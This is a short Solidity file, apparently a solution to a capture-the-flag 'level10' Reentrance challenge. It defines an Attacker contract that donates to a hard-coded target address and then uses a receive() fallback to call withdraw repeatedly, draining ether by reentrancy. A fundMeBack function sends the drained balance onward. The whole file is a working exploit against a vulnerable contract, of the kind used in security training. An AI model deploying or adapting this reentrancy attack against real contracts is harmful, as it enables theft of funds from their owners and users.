//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel10.sol";

contract Attacker {
    Reentrance level10 =
        Reentrance(payable(0x112E069f3e12013c2CD4eFB87064f5c651f10014));

    //payable to make contract receive eth
    constructor() payable {}

    function donate(address _to) external {
        level10.donate{value: 0.001 ether}(_to);
    }

    function withdraw() external {
        level10.withdraw(0.001 ether);
    }

    function getBalance(address _who) external view returns (uint256) {
        return address(_who).balance;
    }

    function fundMeBack(address payable _who) external payable {
        require(_who.send(address(this).balance), "could not send ether");
    }

    //reentrance function call will land here when it trigger call(msg.value) which will call withdraw again
    receive() external payable {
        level10.withdraw(msg.value);
    }
}
